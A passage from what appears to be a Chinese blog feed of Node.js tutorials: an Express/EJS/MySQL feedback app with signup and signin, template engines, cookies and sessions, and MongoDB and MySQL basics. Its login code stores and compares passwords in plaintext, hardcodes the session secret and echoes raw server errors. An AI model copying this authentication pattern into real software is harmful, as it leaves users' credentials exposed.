'views'));app.engine('.html', require('ejs').__express);app.set('view engine', 'html');// 配置 body-parser 中间件app.use(bodyParser.urlencoded(&#123; extended: false &#125;));app.use(bodyParser.json());// 配置 Session 中间件，在进入路由之前配置app.use(session(&#123; secret: 'mhq', resave: false, saveUninitialized: true&#125;));// 没有登录时跳到登录页面app.get('/', (req, res) =&gt; &#123; if (!req.session.user) &#123; return res.redirect('/signin'); &#125; res.render('index', &#123; // session 中保存了 user user: req.session.user &#125;);&#125;);// 处理消息页面的 form 表单数据app.get('/message', (req, res, next) =&gt; &#123; db.query('SELECT * FROM `feedback` ORDER BY `date` DESC', (err, rows) =&gt; &#123; if (err) &#123; return next(err); &#125; rows.forEach(r =&gt; r.date = moment(r.date).format('YYYY-MM-DD HH:mm:ss')) res.json(&#123; messages: rows &#125;); &#125;);&#125;);// 登录成功后跳到首页app.get('/signup', (req, res) =&gt; &#123; if (req.session.user) &#123; return res.redirect('/'); &#125; res.render('signup');&#125;);// 处理注册 post 请求app.post('/signup', (req, res, next) =&gt; &#123; const body = req.body; db.query('SELECT * FROM `users` WHERE `username`=?', [body.username], (err, rows) =&gt; &#123; if (err) &#123; return next(err); &#125; if (rows[0]) &#123; // 说明被占用了 return res.json(&#123; code: 2001, message: 'username already exists' &#125;); &#125; // 执行到这里，可以插入数据了 db.query('INSERT INTO `users`(`username`, `password`, `email`, `create_time`, `last_signin_time`) VALUES(?, ?, ?, ?, ?)', [ body.username, body.password, body.email, moment().format('YYYY-MM-DD HH:mm:ss'), moment().format('YYYY-MM-DD HH:mm:ss') ], (err, stat) =&gt; &#123; if (err) &#123; return next(err) &#125; // 注册成功，保存用户登陆状态 req.session.user = &#123; username: body.username &#125;; res.json(&#123; code: 2000, message: 'success', &#125;); &#125;); &#125;);&#125;);app.get('/signin', (req, res) =&gt; &#123; if (req.session.user) &#123; return res.redirect('/'); &#125; res.render('signin');&#125;);// 处理登录页面 post 请求app.post('/signin', (req, res, next) =&gt; &#123; const username = req.body.username; const password = req.body.password; // 验证用户名是否存在，密码是否正确 db.query('SELECT * FROM `users` WHERE `username`=?', [username], (err, rows) =&gt; &#123; const user = rows[0]; if (!user) &#123; return res.json(&#123; code: 3001, message: 'username not exists' &#125;); &#125; if (password !== user.password) &#123; return res.json(&#123; code: 3002, message: 'password error' &#125;) &#125; // 登陆成功，保存状态 req.session.user = &#123; username: username &#125;; res.json(&#123; code: 3000, message: 'login success' &#125;); &#125;);&#125;);// 处理留言页面的 post 请求的数据app.post('/message/add', (req, res, next) =&gt; &#123; const body = req.body; db.query('INSERT INTO `feedback`(`message`, `name`, `email`, `date`) VALUES(?, ?, ?, ?)', [ body.message, body.name, body.email, moment().format('YYYY-MM-DD HH:mm:ss') ], (err, stat) =&gt; &#123; if (err) &#123; return next(err); &#125; res.json(&#123; code: 1000, message: 'success' &#125;); &#125;);&#125;);app.use((err, req, res, next) =&gt; &#123; res.send(`500 ErrorMessage:$&#123;err.message&#125;`);&#125;);app.listen(3000, () =&gt; &#123; console.log('server is running at port 3000.');&#125;); 处理登录页面 最终的 singin.html 12345678910111213141516171819202122232425262728293031323334353637383940414243444546 &lt;!-- ... --&gt; &lt;body&gt; &lt;div class="container"&gt; &lt;form action="/signin" method="post" class="form-signin" role="form"&gt; &lt;h2 class="form-signin-heading"&gt;用户登陆&lt;/h2&gt; &lt;input type="text" id="username" name="username" class="form-control" placeholder="请输入用户名" required autofocus&gt; &lt;input type="password" name="password" class="form-control" placeholder="Password" required&gt; &lt;div class="checkbox"&gt; &lt;label&gt; &lt;input type="checkbox" value="remember-me"&gt; Remember me &lt;/label&gt; &lt;/div&gt; &lt;button class="btn btn-lg btn-primary btn-block" type="submit"&gt;登陆&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; &lt;script src="/node_modules/jquery/dist/jquery.js"&gt;&lt;/script&gt; &lt;script src="/node_modules/js-cookie/src/js.cookie.js"&gt;&lt;/script&gt; &lt;script&gt; &lt;script&gt; $('form').on('submit', function (e) &#123; e.preventDefault(); $.ajax(&#123; url: $(this).attr('action'), type: $(this).attr('method'), data: $(this).serialize(), dataType: 'json' &#125;).then(data =&gt; &#123; switch (data.code) &#123; case 3000: window.location.href = '/' break; case 3001: window.alert('该用户不存在'); break; case 3002: window.alert('密码错误了'); break; default: window.alert('未知错误'); break; &#125; &#125;); &#125;); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 处理注册页面 最终的 singup.html 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt; &lt;title&gt;用户登陆&lt;/title&gt; &lt;link rel="stylesheet" href="/node_modules/bootstrap/dist/css/bootstrap.css"&gt; &lt;link rel="stylesheet" href="/public/css/signin.css"&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="container"&gt; &lt;form action="/signup" method="post" class="form-signin" role="form"&gt; &lt;h2 class="form-signin-heading"&gt;用户注册&lt;/h2&gt; &lt;input type="text" class="form-control" name="username" placeholder="请输入用户名" required autofocus&gt; &lt;input type="email" class="form-control" name="email" placeholder="请输入邮箱" required&gt; &lt;input type="password" class="form-control" name="password" placeholder="请输入密码" required&gt; &lt;input type="confirm" class="form-control" name="confirm" placeholder="请确认密码" required&gt; &lt;button class="btn btn-lg btn-primary btn-block" type="submit"&gt;注册&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; &lt;script src="/node_modules/jquery/dist/jquery.js"&gt;&lt;/script&gt; &lt;script&gt; // 处理前台逻辑 $('form').on('submit', function (e) &#123; e.preventDefault(); $.ajax(&#123; url: $(this).attr('action'), type: $(this).attr('method'), data: $(this).serialize(), dataType: 'json' &#125;) .then(data =&gt; &#123; if (data.code === 2000) &#123; window.alert('恭喜：注册成功'); // 可以通过控制 location 的 href ，让浏览器跳转 window.location.href = '/'; &#125; else if (data.code === 2001) &#123; window.alert('用户名已存在，请更换重试'); &#125; &#125;); &#125;); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 数据库连接 连接数据库关键代码：db.js 1234567891011121314151617181920212223242526272829303132333435363738const mysql = require('mysql');// 使用连接，提高操作数据库效率// 创建一个连接池，池子存放的连接数量是 100 个const pool = mysql.createPool(&#123; connectionLimit: 100, host: 'localhost', user: 'root', password: '*********', database: 'feedback'&#125;);// rest 参数// 作为函数参数的最后一个参数出现，以 ... 开头，后面跟一个名字// rest 参数就代替了 argumentsexports.query = function (sql, ...values) &#123; let callback; let params = []; if (values.length === 3) &#123; params = values[1]; callback = values[2]; &#125; else if (values.length === 2) &#123; callback = values[1]; &#125; pool.getConnection((err, connection) =&gt; &#123; if (err) &#123; return callback(err); &#125; // 如果传递了两个参数，则第二个参数就是 callback，也就是说这种情况下，params 就是 callback // 后面的 参数就忽略不计了 // 如果传递了三个参数，那就是一一对应 connection.query(sql, params, (err, result) =&gt; &#123; connection.release(); if (err) &#123; return callback(err); &#125; callback(null, result); &#125;) &#125;);&#125;; css12345678body &#123; padding-top: 40px; padding-bottom: 40px; background-color: #eee; &#125;.form-signin &#123;max-width: 330px; padding: 15px; margin: 0 auto;&#125;.form-signin .form-signin-heading,.form-signin .checkbox &#123;margin-bottom: 10px;&#125;.form-signin .checkbox &#123;font-weight: normal;&#125;.form-signin .form-control &#123; position: relative; height: auto; box-sizing: border-box; padding: 10px; font-size: 16px; &#125;.form-signin .form-control:focus &#123;z-index: 2;&#125;.form-signin input[type="email"] &#123;margin-bottom: -1px; border-bottom-right-radius: 0; border-bottom-left-radius: 0;&#125;.form-signin input[type="password"] &#123; margin-bottom: 10px; border-top-left-radius: 0; border-top-right-radius: 0; &#125;]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
        <tag>Express</tag>
        <tag>EJS</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Express中使用模板引擎]]></title>
    <url>%2F2017%2F04%2F28%2FExpress%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%2F</url>
    <content type="text"><![CDATA[在 Express 中使用 ejs 模板引擎安装： 1$ npm install --save ejs 配置 Express 使用 ejs 模板 app.set(&#39;views&#39;, config.viewPath); 配置模板文件存放的路径 app.set(&#39;view engine&#39;, &#39;ejs&#39;); 配置调用 res.render 的时候使用的模板引擎 找到 view 目录下的 .ejs 后缀的文件 12app.set('views', '视图模板文件存放路径')app.set('view engine', '安装的模板引擎的名称，例如：ejs') 如果使用上面的配置，则视图的后缀名必须为 .ejs，如果想要修改视图的后缀名，可以使用下面的配置形式 12app.engine('.html', require('ejs').__express)app.set('view engine', 'html') 使用： 只要执行了上面两句代码：就可以直接在后面的请求处理函数中使用 res.render(视图名称，要注入的数据对象)，然后express会自动帮你去读取文件然后注入数据，解析替换，最后得到一个完整的 html 页面，然后发送给客户端。 如 views/index.html 文件代码如下： 12345678910&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;Hello &lt;%= name %&gt;&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt; app.js 文件代码如下： 12345app.get('/', (req, res) =&gt; &#123; res.render('index', &#123; name: 'World' &#125;)&#125;) 浏览器中看到的最终渲染结果如下： 12345678910&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;Hello World&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt; 在 Express 中使用 xTemplate 模板引擎安装1$ npm install xtpl xtemplate --save 配置模板引擎1、渲染的页面必须是 .xtpl 后缀的 123456// 引入路径配置文件const config = require('./config');// 指定模板放在什么地方了app.set('views', config.viewPath);// 指定使用哪个模板引擎app.set('view engine', 'xtpl'); 2、渲染页面任然是 .hmtl 后缀的 1234const config = require('./config');app.set('views', config.viewPath);app.engine('.html', require('xtpl').__express);app.set('view engine', 'html'); Node 走通页面流程1、安装包： 12$ npm install --save express$ npm install xtpl xtemplate --save 2、views 文件下添加要渲染的 layout/base.html 页面视图文件 123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;后台管理系统&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- 侧边栏 --&gt; &lt;div class="aside"&gt; &lt;!-- ... --&gt; &lt;/div&gt; &lt;!-- 主体 --&gt; &lt;div class="main"&gt; &lt;div class="container-fluid"&gt; &lt;!-- 头部 --&gt; &lt;div class="header"&gt; &lt;!-- ... --&gt; &lt;/div&gt; &lt;!-- 个人资料 --&gt; &#123;&#123;&#123;block('content')&#125;&#125;&#125; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 3、中间需要替换的内容 1234567&#123;&#123;extend('../layout/base')&#125;&#125;&#123;&#123;#block('content')&#125;&#125;&lt;!-- 个人资料 --&gt;&lt;div class="body teacher-profile"&gt; &lt;!-- ... --&gt;&lt;/div&gt;&#123;&#123;/block&#125;&#125; 4、入口程序：app.js 1234567891011121314// 引入包const express = require('express');// 加载子路由const index = require('./controllers/index');// 配置模板引擎app.set('views', config.viewPath);app.engine('.html', require('xtpl').__express);app.set('view engine', 'html');// 暴漏静态资源app.use('/',express.static('public'));// 监听端口app.listen(5000, () =&gt; &#123; console.log(`Server is running at port $&#123;config.port&#125;`);&#125;); 5、设置子路由，contorllers/index.js 12345678910// 首页当做一个子路由const express = require('express');// express 有个方法叫 Router() 方法，创建子路由const router = express.Router();// 当成一个模块加载，对外暴漏接口，子路由暴漏出去了module.exports = router;// 设置子路由router.get('/', function (req, res) &#123; res.render('dashboard/index', &#123;&#125;);&#125;);]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
        <tag>Express</tag>
        <tag>EJS</tag>
        <tag>xTemplate</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cookie、Session 存储技术]]></title>
    <url>%2F2017%2F04%2F08%2FCookie%E3%80%81Session%20%E5%AD%98%E5%82%A8%E6%8A%80%E6%9C%AF%2F</url>
    <content type="text"><![CDATA[Cookie保存用户和网站之间的一个状态。 Cookie（复数形态Cookies），中文名称为“小型文本文件”或“小甜饼” 指某些网站为了辨别用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密）。 是网景公司的前雇员卢·蒙特利在1993年3月的发明 历史记录是浏览器的一个特性，cookie 使用了保持状态的一种手段 浏览器缓存分为好几种 一般所指缓存有静态资源缓存： css、img、JavaScript 不是经常变换的资源可以设置环境 也不是浏览器能做到的 304 服务器做的 动态资源缓存 浏览器可以做到 例如不常变化的接口资源 例如商品分类 HTTP 无状态 跟客户端交互，到底做了什么事情，对于服务器来说根本就不知道 为什么不记住客户端跟我做了什么事情？ 客户端第一次请求过来 服务器校验一下客户端有没有那个标记（Cookie凭证） 如果发现有，则不给标记 如果发现没有：写Cookie（贴凭证） 什么是 Cookie所谓的 Cookie 其实就是服务器和客户端浏览器约定好的一种规则。只要服务器给客户端浏览器发送了一个 Cookie，则浏览器以后的每次请求中都会自动带着这个 Cookie 上来。 Cookie 就是通过 HTTP 请求报文和响应报文配合完成。 如何使用利用响应头：Set-Cookie 来写 Cookie，然后解析请求头中的 cookie 来读取。 利用 http 模块来写入 Cookie123456789101112131415161718192021222324252627282930313233const http = require('http');// 是不是第一次访问网站// 如果是第一次访问：告诉用户是第一个访问该网站// 如果不是第一次访问：告诉用户欢迎再次访问http.createServer() .on('request', (req, res) =&gt; &#123; // 如果你给客户端发送过这个 Cookie 了 // 则客户端请求的时候会自动带过来 // 然后将 Cookie 放到请求报文中 const cookies = req.headers['cookie']; req.cookie = &#123;&#125;; if (cookies) &#123; cookies.split(';').forEach(cookie =&gt; &#123; const tmp = cookie.split('='); req.cookie[tmp[0]] = tmp[1]; &#125;); &#125; if (req.cookie.isFirst) &#123; res.writeHead(200, &#123; 'Content-Type': 'text/plain; charset=utf-8', &#125;); res.end('欢迎再次光临...'); &#125; else &#123; res.writeHead(200, &#123; 'Content-Type': 'text/plain; charset=utf-8', 'Set-Cookie': 'isFirst=true; Max-Age=20;', &#125;); res.end('欢迎第一次访问'); &#125; &#125;); .listen(4000, () =&gt; &#123; console.log('runnning...'); &#125;); 利用前台 js 代码写入 Cookie123456789101112&lt;script src="/node_modules/jquery/dist/jquery.js"&gt;&lt;/script&gt;&lt;script src="/node_modules/js-cookie/src/js.cookie.js"&gt;&lt;/script&gt;&lt;script&gt; var username = Cookies.get('username'); if (username) &#123; document.querySelector('#username').value = username; &#125; $('form').on('submit', function (e) &#123; e.preventDefault(); Cookies.set('username', $('#username').val()); &#125;);&lt;/script&gt; 在 Express 中使用 cookie-parser 中间件解析 cookie安装： 1$ npm install --save cookie-parser 配置： 12345const express = require('express');const cookieParser = require('cookie-parser');const app = express();// 配置中间件app.use(cookieParser()); 使用： 1234567891011121314151617181920const express = require('express');const cookieParser = require('cookie-parser');const app = express();// 只要在 Express 中配置了这个中间件，使用 Cookie 解析中间件。app.use(cookieParser());app.get('/', (req, res) =&gt; &#123; // req.cookies 用来获取请求中的 Cookie if (req.cookies.isFirst) &#123; res.send('欢迎再次访问本网站'); &#125; else &#123; // 第三个参数设置过期时间 res.cookie('isFirst', 'true', &#123; maxAge: 10 * 1000 &#125;); res.send('欢迎第一次访问'); &#125;&#125;);app.listen(3000, () =&gt; &#123; console.log('running...');&#125;); Cookie 的分类 会话 Cookie，也叫 内存 Cookie，存在于浏览器运行的进程中 只要浏览器一关闭，Cookie 就会被销毁 持久化 Cookie 持久化 Cookie 会保存在磁盘上 通过过期时间来设定持久 Cookie 的保存时间 Cookie 的使用场景 购物车 没有登陆之前商品数据是保存到 Cookie 中了 记住用户名 利用 Cookie 保存用户名 记住我 利用 Cookie 来保存用户名和密码（加密之后保存的） Cookie 一般适用于安全性要求不高的场景。 Cookie 的缺陷 Cookie体积过大会造成请求和响应速度变慢 尽量不要再Cookie中存储大量数据 默认浏览器会对任何请求把 Cookie 带上去 哪怕是静态资源：/public/css/main.css 所以说在静态资源请求中带着 Cookie 上去，没有意义，影响性能 一般大型网站会专门把静态资源存储到单独的域名服务器上 Cookie可以在前后端修改，数据容易被篡改和伪造 Cookie对于敏感数据的保护基本是无效的 Cookie 就是保存状态数据的。 sessionSession 是基于 Cookie 的。Cookie 是 session 的凭证。 在 Express 中使用 express-session 中间件Session原理 安装： 1$ npm install --save express-session 配置： 1234567const session = require('express-session');// secret 就是私钥，生成钥匙的时候会根据这个私有加密，用来访问别人伪造钥匙app.use(session(&#123; secret: 'hq', resave: false, saveUninitialized: true&#125;)); 基本使用： 12345678910111213141516171819202122232425262728293031323334353637const express = require('express');const session = require('express-session');const app = express();// secret 表示生成钥匙的时候根据这个字符串生成// 这个字符串一般被称为私钥app.use(session(&#123; secret: 'mhq', resave: false, saveUninitialized: true&#125;));app.get('/', (req, res) =&gt; &#123; // 只要配置了 Session 中间件 // 那么，客户端请求过来就会直接给其分配一把钥匙，在本次请求会话过程中都是同一个 // Session 也分为会话 Session 和 持久 Session // 没有配置 Session 中间件之前 req 对象是没有 session 这个属性的 // 配置完毕之后，req 请求对象会多出一个 Session 属性出来 // req.session 就是根据客户端的凭证找到其对应的数据 // console.log(req.session); // session 数据是保存在当前运行的 node 进程中的，也就是保存在内存中 // 只要服务器重启，或者服务器宕机了，则 Session 数据丢失 if (req.session.isLogin) &#123; res.send('欢迎再次访问'); &#125; else &#123; // 通过客户端的 Cookie 钥匙凭证，找到对应的数据格子 // 找到数据格式之后，往里面加一个属性：isLogin req.session.isLogin = true; res.send('欢迎第一次访问'); &#125;&#125;);app.get('/logout', (req, res) =&gt; &#123; // 清除 Session 中的数据 req.session.isLogin = null; res.send('用户退出了');&#125;);app.listen(3000, () =&gt; &#123; console.log('running...')；&#125;); 总结cookie 和 sessionCookie虽在持久保存客户端数据提供方便并分担服务器存储负担，但有很多局限性 弊端 IE6 或更低的版本最多 20 个 cookie IE7 和之后的版本最后可以有 50 cookie FireFox 最多 50 个 cookie chrome 和 Safari 没有做硬性限制 IE 和 opera 会清理近期最少使用的 cookie，FireFox 会随时清理 cookie，cookie 的最大容量为 4096 字节，为了兼容性，一般不能超过 4095 IE 提供了一种存储可以支持持久化用户数据，叫做 userdata ,从 IE5.0 就开始支持。每个数据最多 128k ,每个域名下最多 1M。这个持久化数据放在缓存中，如果缓存没有清理，那么会一直存在。 优点：极高的扩展性和可用性 通过良好的编程，控制保存在 cookie 中的 session 对象的大小 通过加密和安全传输技术（SSL），减少 cookie 被破解的可能性 只要在 cookie 中存放不敏感数据，即使被盗也不会有重大损失 控制 cookie 的生命周期，使之不会永远有效。偷盗者很可能拿到一个过去的 cookie 缺点 cookie 数量和长度的限制。每个 domain 最多只能有 20 条 cookie ，每个 cookie 的长度不能超过 4kb，否则被截掉； 安全性问题。如果 cookie 被拦截了，那么拦截者就可以取得所有的 session 信息。即使密码加密也于事无补，因为拦截者并不需要知道 cookie 的意义，他只要原样转发 cookie 就可以达到目的了； 有些状态不可能保存客户端。例如：为了防止重复提交表单，我们需要在服务器端保存一个计数器。如果我们把这个计数器保存在客户端，那么它起不到任何作用。 浏览器本地存储 在较高版本浏览器中，JavaScript 供了 sessionStorage 和 globalStorage ,在 HTML5 中提供了 localStorage 来取代 lobalStorage H5 中的 web Storage 中包括两种存储方式：sessionStorage 和 localStorage sessionStorage和localStorage区别sessionStorage 和localStorage 都有相同的方法，例如：setItem, getItem, removeItem, clear sessionStorage 用于本地存储一个会话（session）中的数据，这些数据只有在同一个会话中的页面才能访问并且当会话结束后数据也会随之消失。因此，sessionStorage 不是一种持久化的本地存储，仅仅是会话级别的存储。 localStorage 用于持久化的本地存储，除非主动删除数据，否则数据是永远不会过期的。 web Storage 和 cookieweb Storage 和 cookie 相似，web Storage 的存储更大； cookie 大小受限，并且每次新请求一个页面 cookie 都会发送过去，浪费了带宽； cookie 还需要指定作用域，不可以跨域调用； cookie 是不可缺的：其作用是与服务器进行交互，作为 HTTP 规范的一部分二存在，而 Web Storage 仅仅是为了在本地“存储”数据而生。 web Storage方法：setItem, getItem, removeItem, clear等方法，而 cookie 需要开发者自己封装 setCookie， getCookie。 浏览器的支持浏览器的支持除了IE7以下不支持外，其他标准浏览器都完全支持（IE及FF需要在web服务器里运行）。 IE6,7中的 userDat a其实就是 javascript 本地存储的解决方案。通过简单封装代码就可以使所有的浏览器都支持 Web Storage。 session 和 cookie 区别cookie 数据存储在客户的浏览器上，session 数据放在服务器上； cookie 数据不安全，别人可以分享存放在本地的 cookie 并进行 cookie 欺骗，考虑到安全性应当使用 session； session 一般会在一定的时间内保存在服务器上。当访问增多，会比较占用服务器的性能； 单个 cookie 保存的数据不能超过 4k，很多浏览器都限制一个站点最多保存 20 个 cookie； 个人等数据存放为 session 稳妥；其他数据可以存放到 cookie 中。 总的来说： cookies 兼容所有的浏览器，Html5 提供的storage 存储方式。 Document.cookie Window.localstorage Window.sessionstorage cookie 数据始终在同源的 http 请求中携带（即使不需要），即 cookie 在浏览器和服务器间来回传递。而 sessionStorage 和 localStorage 不会自动把数据发给服务器，仅在本地保存。 存储大小限制也不同，cookie 数据不能超过 4k，同时因为每次http请求都会携带 cookie ，所以 cookie 只适合保存很小的数据，如会话标识。sessionStorage 和 localStorage 虽然也有存储大小的限制，但比cookie大得多，可以达到 5M 或更大。 数据有效期不同，sessionStorage：仅在当前浏览器窗口关闭前有效，自然也就不可能持久保持；localStorage：始终有效，窗口或浏览器关闭也一直保存，因此用作持久数据；cookie 只在设置的 cookie 过期时间之前一直有效，即使窗口或浏览器关闭。 作用域不同，sessionStorage 不在不同的浏览器窗口中共享，即使是同一个页面；localStorage 在所有同源窗口中都是共享的；cookie 也是在所有同源窗口中都是共享的。]]></content>
      <categories>
        <category>Storage</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
        <tag>Cookie</tag>
        <tag>Session</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据库基础 以及 Node 操作方法]]></title>
    <url>%2F2017%2F03%2F28%2F%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%20%E4%BB%A5%E5%8F%8A%20Node%20%E6%93%8D%E4%BD%9C%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[数据库：存储数据的仓库。 数据结构化 实现数据共享 可以减少冗余数据 数据独立性高 数据统一管理与控制 数据库介绍 MySQL 数据库 Oracle Orcale数据库管理系统由甲骨文公司开发，在数据库领域一直处于领先地位 商业收费，大型系统，淘宝、京东就使用了 Oracle 数据库 SqlServer 数据库 由微软公司开发，只能在Windows上运行。.net开发程序员 DB2 由IBM公司开发，在金融行业中使用的比较多。IBM的服务器，买服务器送数据库 商业收费 MS SQL Server 以上这些数据库都是使用 SQL 语言进行操作 SQL 语言就是用于 关系型数据库 的一个操作语言 利用这个 SQL 语言可以增删改查库和表，以及增删改查表数据 表 就是 关系 表与表之间就是关系 MongoDB 非关系型数据库 没有表，这个数据库中存储的数据都在集合中，类似于 JavaScript 对象，其实就是 json 格式的数据 集合没有结构，集合就是一个数组 也可以往集合中插入数据 关系型数据库存储结构 数据库服务器 数据库管理系统 数据库 数据表 根据业务设计表结构 记录 根据表结构存储记录数据 MongoDBMongoDB是由10gen公司开发的一个介于关系型数据库和非关系型数据库之间的产品，是非关系型数据库中功能最丰富，最像关系型数据库的。他支持的数据结构非常松散，是类似json的格式，所以可以存储比较复杂的数据结构类型。MongoDB数据库管理系统最大的特点就是它支持的查询语言非常强大，语法类似于面向对象的查询语言。它还是一个开源的数据库，对于大数据量、高并发的互联网应用，支持非常不错。操作非关系型数据库不需要使用SQL语言。 MongoDB 官网：https://www.mongodb.com/ MongoDB 是一个非关系型数据库 面向文档存储 开源免费、高性能 MongoDB 将数据存储为一个文档，数据结构由键值(key=&gt;value)对组成 MongoDB 文档类似于 JSON 对象 字段值可以包含其他文档，数组及文档数组 Mongo支持丰富的查询表达式 查询指令使用JSON形式的标记，可轻易查询文档中内嵌的对象及数组。 创建数据目录并启动MongoDB数据库服务器 启动MongoDB数据库需要指定一个数据存储目录 在 c 盘 根目录创建一个目录：data 接下来启动 MongoDB 服务器 打开终端，输入：mongod 你刚才创建的目录的绝对路径 注意：如果发现执行上面的命令收到这样一个提示： 1&apos;mongod&apos; 不是内部或外部命令，也不是可运行的程序或批处理文件。 解决方案：将 MongoDB 安装目录下的 bin 目录配置到环境变量。 如果执行完上面的命令启动成功后不要动这个命令台了，说明 MongoDB 服务器正在运行。 MongoDB 默认运行的端口号是 27017 如何关闭？ 在终端中：Ctrl + C 关闭 MongoDB 数据库。 连接 MongoDB 数据库存储结构 数据库 一个mongodb中可以建立多个数据库 MongoDB的默认数据库为”db”，该数据库存储在data目录中 MongoDB的单个实例可以容纳多个独立的数据库，每一个都有自己的集合和文档 不同的数据库也放置在不同的文件中 show dbs 显示所有数据库列表 db 显示当前数据库对象或集合 use 数据库名字 连接到一个指定的数据库 集合 集合就是 MongoDB 文档组，类似于关系型数据库中的表 集合存在于数据库中，集合没有固定的结构，就是一个 JSON 通常情况下我们插入集合的数据都会有一定的关联性。 当第一个文档插入时，集合就会被创建。 db.col.find() 查询所有数据 db.col.findOne({}) 查询指定数据 文档 文档是一个键值(key-value)对(即BSON) 基本操作 show dbs 查看数据库列表 use 名称 创建一个数据库 这里表示如果有该数据库则切换到该数据库 如果没有，则创建（创建不是真的创建，只有当你在这个数据库中插入一个集合数据之后才会创建成功） show collections 查看当前数据库中的集合 db.集合名称.insert({文档对象}) 向集合中插入一个文档（JSON 对象） 如果该集合不存在，则直接新建，并将数据插入进去 如果该集合已存在，则直接将数据添加到该集合中 db.集合名.find() 查询集合中的所有数据 db.集合名.find(文档条件) 按照文档条件查询 db.集合名.findOne(文档条件) 按照文档条件查询，只查询匹配项的第一个 db.dropDatabase() 自杀，删除数据库当前数据库 db.集合名.drop() 删除数据库中的指定集合 db.集合名.update(文档条件, 文档对象) 根据文档条件，整体更新为文档对象 db.集合名.update(文档条件, { $set:文档对象 }) 根据文档条件，更新指定字段 如果更新的文档对象中的字段已存在，则更新 如果不存在，则直接怼进去 db.集合名.save(文档) 如果文档中包含一个 &quot;_id&quot; : ObjectId(&quot;56064f89ade2f21f36b03136&quot;) 该字段 则会找到匹配项条件，整体替换 如果没有该字段，则直接 insert db.集合名.remove(条件文档) http://www.runoob.com/mongodb/mongodb-operators.html 条件操作符 在 Node 中操作 MongoDB12345678910111213141516171819202122232425var mongodb = require('mongodb');var MongoClient = mongodb.MongoClient;// Connection URL var url = 'mongodb://localhost:27017/itcast';// Use connect method to connect to the Server MongoClient.connect(url, function (err, db) &#123; // 2. 使用 db // 插入数据 // db.collection('duanzi').insertMany([ // &#123; nickname: '斜阳烟柳', gender: 0, age: 20, content: '小时候，村里有只狗很凶，我和哥哥对它又恨又怕。一次，我哥在家偷我爸的酒喝。碰巧那只狗从我家门前经过，我哥借酒壮胆，抄起棍子冲了出去。凶狗见势不妙，仓皇逃窜，我哥就满村追着打。第二天，我哥和凶狗在一条窄巷遇上，彼此一愣，各自扭头撒腿就跑...', &#125; // ], (err, result) =&gt; &#123; // if (err) &#123; // throw err; // &#125; // console.log('插入数据成功'); // &#125;); // 查询数据 db.collection('duanzi').find(&#123;&#125;).toArray((err, docs) =&gt; &#123; if (err) &#123; throw err; &#125; console.log(docs); &#125;) db.close();&#125;); oracle、sqlserver、DB2、MySQL 都是关系型数据库。 安装和配置 MySQL 数据库官方网站：http://www.mysql.com/ 启动 和 停止MySQL服务： 通过Windows的运行，输入services.msc找到MySQL服务 通过DOS命令启动MySQL服务（使用管理员权限打开终端） 登录MySQL数据库: mysql -h localhost -P 3306 -u root -p -h：主机名 -P：端口 -u：用户名 -p：密码 mysql默认连接localhost和3306，所以可以省略-h和-P: mysql -u root -p 在命令行中输入“help;”或者“\h”，就会显示出MySQL的帮助信息。 命令 简写 具体含义 ? \? 显示帮助信息 exit \q 退出MySQL help \h 显示帮助信息 quit \q 退出MySQL status \s 获取MySQL服务器状态信息 use \u 用来选择一个数据库，以一个数据库名作为参数 数据库的存储结构 一个数据库服务器上可以有多个数据库 一个数据库中可以有多个表 一个表一定要有表结构 所有的数据存储在表中，所以有了数据库之后，要先设计你的表结构 一张表中存储多条记录 记录按照表结构的形式进行存储 创建数据库和表创建数据库1CREATE DATABASE [IF NOT EXISTS] db_name 查看数据库1SHOW DATABASES; 显示数据库创建语句1SHOW CREATE DATABASE db_name; 删除数据库1DROP DATABASE [IF EXISTS] db_name; 选择数据库1USE db_name; 查看当前使用的数据库1SELECT database(); 数据类型整数类型 类型 大小 范围（有符号） 范围（无符号） 用途 TINYINT 1 字节 (-128，127) (0，255) 小整数值 SMALLINT 2 字节 (-32 768，32 767) (0，65 535) 大整数值 MEDIUMINT 3 字节 (-8 388 608，8 388 607) (0，16 777 215) 大整数值 INT或INTEGER 4 字节 (-2 147 483 648，2 147 483 647) (0，4 294 967 295) 大整数值 … … … … … 浮点型在MySQL数据库中，存储小数都是使用浮点数和定点数来表示的。 浮点数有两种： 单精度浮点数（FLOAT） 双精度浮点数(DOUBLE) 定点数（DECIMAL）[ˈdesɪml] 时间和日期类型 类型 大小(字节) 范围 格式 用途 DATE 3 1000-01-01/9999-12-31 YYY-MM-DD 日期值 TIME 3 